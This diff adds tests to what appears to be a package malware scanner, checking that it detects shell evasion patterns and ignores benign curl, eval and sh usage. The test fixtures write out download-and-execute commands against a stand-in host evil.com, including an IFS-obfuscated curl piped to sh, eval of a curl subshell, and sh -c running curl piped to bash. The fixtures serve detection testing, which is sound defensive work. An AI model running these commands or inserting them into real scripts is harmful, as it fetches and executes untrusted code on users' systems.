@@ -167,6 +167,56 @@ async function runShellTests() {
       assert(!t, 'base64 -d without pipe to bash should NOT be detected');
     } finally { cleanupTemp(tmp); }
   });
+
+  // --- IFS evasion patterns (v2.6.9) ---
+
+  await asyncTest('SHELL B16: curl$IFS evasion pipe to shell detected', async () => {
+    const tmp = fs.mkdtempSync(path.join(os.tmpdir(), 'muaddib-shell-'));
+    fs.writeFileSync(path.join(tmp, 'package.json'), JSON.stringify({ name: 'test-shell', version: '1.0.0' }));
+    fs.writeFileSync(path.join(tmp, 'exploit.sh'), '#!/bin/bash\ncurl${IFS}https://evil.com/payload.sh|sh');
+    try {
+      const result = await runScanDirect(tmp);
+      const t = (result.threats || []).find(t => t.type === 'curl_ifs_evasion');
+      assert(t, 'curl$IFS pipe to shell should be detected');
+    } finally { cleanupTemp(tmp); }
+  });
+
+  await asyncTest('SHELL B17: eval $(curl ...) detected', async () => {
+    const tmp = fs.mkdtempSync(path.join(os.tmpdir(), 'muaddib-shell-'));
+    fs.writeFileSync(path.join(tmp, 'package.json'), JSON.stringify({ name: 'test-shell', version: '1.0.0' }));
+    fs.writeFileSync(path.join(tmp, 'exploit.sh'), '#!/bin/bash\neval $(curl -s https://evil.com/script)');
+    try {
+      const result = await runScanDirect(tmp);
+      const t = (result.threats || []).find(t => t.type === 'eval_curl_subshell');
+      assert(t, 'eval $(curl) should be detected');
+    } finally { cleanupTemp(tmp); }
+  });
+
+  await asyncTest('SHELL B18: sh -c curl detected', async () => {
+    const tmp = fs.mkdtempSync(path.join(os.tmpdir(), 'muaddib-shell-'));
+    fs.writeFileSync(path.join(tmp, 'package.json'), JSON.stringify({ name: 'test-shell', version: '1.0.0' }));
+    fs.writeFileSync(path.join(tmp, 'exploit.sh'), '#!/bin/bash\nsh -c \'curl https://evil.com/stage2 | bash\'');
+    try {
+      const result = await runScanDirect(tmp);
+      const t = (result.threats || []).find(t => t.type === 'sh_c_curl_exec');
+      assert(t, 'sh -c curl should be detected');
+    } finally { cleanupTemp(tmp); }
+  });
+
+  await asyncTest('SHELL B16-18 negative: benign curl/eval/sh usage NOT detected', async () => {
+    const tmp = fs.mkdtempSync(path.join(os.tmpdir(), 'muaddib-shell-'));
+    fs.writeFileSync(path.join(tmp, 'package.json'), JSON.stringify({ name: 'test-shell', version: '1.0.0' }));
+    fs.writeFileSync(path.join(tmp, 'safe.sh'), '#!/bin/bash\ncurl -o output.json https://api.example.com/data\neval "echo hello"\nsh -c \'echo test\'');
+    try {
+      const result = await runScanDirect(tmp);
+      const ifsT = (result.threats || []).find(t => t.type === 'curl_ifs_evasion');
+      const evalT = (result.threats || []).find(t => t.type === 'eval_curl_subshell');
+      const shT = (result.threats || []).find(t => t.type === 'sh_c_curl_exec');
+      assert(!ifsT, 'Benign curl should NOT trigger curl_ifs_evasion');
+      assert(!evalT, 'Benign eval should NOT trigger eval_curl_subshell');
+      assert(!shT, 'Benign sh -c should NOT trigger sh_c_curl_exec');
+    } finally { cleanupTemp(tmp); }
+  });
 }
 
 module.exports = { runShellTests };
